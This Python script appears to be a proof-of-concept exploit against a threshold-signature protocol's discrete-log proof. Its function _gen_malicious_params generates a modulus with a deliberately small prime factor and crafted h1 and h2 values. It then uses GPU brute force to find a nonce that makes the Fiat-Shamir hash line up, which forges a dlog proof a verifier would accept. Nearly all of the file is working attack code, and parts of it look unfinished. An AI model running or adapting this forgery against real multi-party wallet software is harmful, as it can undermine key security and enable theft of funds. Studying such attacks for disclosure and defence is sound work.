from Crypto.Hash import SHA512
from Crypto.Util.number import isPrime

from sympy import primerange, isprime, discrete_log, is_quad_residue, gcd
from sympy.ntheory.modular import crt
from cuda_run import work
from typing import List, Tuple

import bisect
import random
import time
SMALL_PRIMES = list(primerange(10 ** 3, 10 ** 4))
SECP256K1_Q = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141

def search_prime(min_p, max_p) -> int:
    """Find a prime `p` such that Zp* is of smooth order."""
    lb = min_p // SMALL_PRIMES[-1] + 1
    ub = max_p // SMALL_PRIMES[0]
    while True:
        p = 2
        while p < lb:
            p *= random.choice(SMALL_PRIMES)
        if p > ub:
            continue
        p *= SMALL_PRIMES[bisect.bisect_right(SMALL_PRIMES, min_p // p)]
        p += 1
        if isprime(p):
            return p

def _hash_ints(ints: List[int], log=False) -> int:
    hash_obj = SHA512.new(truncate='256')
    full_buf = b''
    for x in ints:
        buf = x.to_bytes((x.bit_length() + 7) // 8, "big")
        hash_obj.update(len(buf).to_bytes(2, "little"))
        hash_obj.update(buf)
        full_buf += len(buf).to_bytes(2, "little")
        full_buf += buf
    if log:
        full_buf = list(full_buf)
        extra = full_buf[128*4:]
        print("full ", len(full_buf), full_buf)
        print("extra", len(extra), extra)
        print(hash_obj.hexdigest())
    return int.from_bytes(hash_obj.digest(), "big")

def _hash_buffer(ints):
    r = b''
    for x in ints:
        buf = x.to_bytes((x.bit_length() + 7) // 8, "big")
        r += len(buf).to_bytes(2, "little")
        r += buf
    return r

def _int_buffer(x):
    return x.to_bytes((x.bit_length() + 7) // 8, "big")



N_LENGTH = 2048
P_LENGTH = 16
Q_LENGTH = N_LENGTH - P_LENGTH
SALT = int.from_bytes(b"ING TS dlog proof sub-protocol v1.0", "big")


def _gen_malicious_params():
    """Search for suitable p, q, h1, h2."""

    # search for p, q
    mask_p = (0b11 << (P_LENGTH - 2)) | 1
    mask_q = (0b11 << (Q_LENGTH - 2)) | 1

    print("generating p, q")
    p = q = 0
    while not isPrime(p):
        p = random.getrandbits(P_LENGTH) | mask_p
    while not (isprime(q) and gcd(p - 1, q - 1) == 2 and is_quad_residue(2, q)):
        q = search_prime(2 ** (N_LENGTH - 1) // p + 1, 2 ** N_LENGTH // p - 1)

    N = p * q
    phiN = (p - 1) * (q - 1)
    order = phiN // 4

    print("searching for h1, h2")
    h1 = 2
    h2 = int(crt([p, q], [1, 2])[0])
    while True:
        try:
            assert is_quad_residue(h1, p) and is_quad_residue(h1, q), "inappropriate h1"
            secret_q = discrete_log(q, h2, h1)
            assert pow(h1, secret_q, q) == h2 % q, "log(h2, base=h1, modulo=q) does not exist"
            secret = int(crt([(p - 1) // 2, (q - 1) // 2], [0, secret_q])[0])
            k = secret // ((p - 1) // 2)
            assert gcd(k, order) == 1, "k has no inverse"
            k_inv = pow(k, -1, order)
        except Exception as err:
            print(err)
            h1 += 1
            continue
        break
    print("done searching for h1, h2")
    assert pow(h1, order, N) == 1
    assert pow(h2, order, N) == 1

    # build proof for log(h2, base=h1)
    # g, V = h2, h1
    # secret = p - 1
    # r = 222
    # x = pow(g, r, N)
    # c = _hash_ints([SALT, N, g, V, x])
    # y = (r - c * secret) % phiN
    # proof_dlog_h2_base_h1 = (y, c)

    g, V = h2, h1
    assert g % p == 1 and g % q == 2
    inv_p_mod_q = pow(p, -1, q)

    # sample hash values
    # _hash_ints([SALT, N, g, V], log=True)

    # hash1 = _hash_ints([SALT, N, g, V, pow(g, r, N)])

    r = 0
    hash2 = _hash_ints([SALT, N, g, V, pow(2, r, q)], log=True)
    print("r=", r, hex(hash2))

    r = 1000
    hash2 = _hash_ints([SALT, N, g, V, pow(2, r, q)], log=True)
    print("r=", r, hex(hash2))

    r = 10000
    hash2 = _hash_ints([SALT, N, g, V, pow(2, r, q)], log=True)
    print("r=", r, hex(hash2))

    r = 100000
    hash2 = _hash_ints([SALT, N, g, V, pow(2, r, q)], log=True)
    print("r=", r, hex(hash2))

    # exit(0)

    if True:
        r = work(
            p_buf=_int_buffer(p),
            q_buf=_int_buffer(q),
            p_inv_buf=_int_buffer(inv_p_mod_q),
            max_r = 2**min(P_LENGTH+10, 64),
            threads = 256,
            blocks = 64,
            kernel_batch_size = 1000,
        )
        if r is not None:
            for rr in range(r,r+1):
                # x = pow(2, rr, q)
                x = pow(g, rr, N)
                c = _hash_ints([SALT, N, g, V, x])
                print("salt=", SALT)
                print("N=", N)
                print("g=", g)
                print("v=", V)
                print("x=", x)
                print("H1=", h1)
                print("H2=", h2)
                print("R=", rr)
                print("C=", c)
                print("P=", p)
                print("Q=", q)
                print("N=", N)
                print("c % (p - 1)/2 =", c % ((p - 1) // 2))
        proof_dlog_h2_base_h1 = None
    else:
        # forge proof for log(h1, base=h2)
        g, V = h2, h1
        time_start = time.time()
        for r in range(p):
            c = _hash_ints([SALT, N, g, V, pow(g, r, N)])
            if c % (p - 1) == 0:
                break # Found
            if r%10000==0:
                print("Speed = ", (r+1)/((time.time()-time_start)*1000), "K/s")
        print("Speed = ", (r+1)/((time.time()-time_start)*1000), "K/s")
    y = (r - c // (p - 1)) % phiN
    proof_dlog_h1_base_h2 = (y, c)

    return p, q, h1, h2, proof_dlog_h2_base_h1, proof_dlog_h1_base_h2


p, q, h1, h2, proof_dlog_h2_base_h1, proof_dlog_h1_base_h2 = _gen_malicious_params()
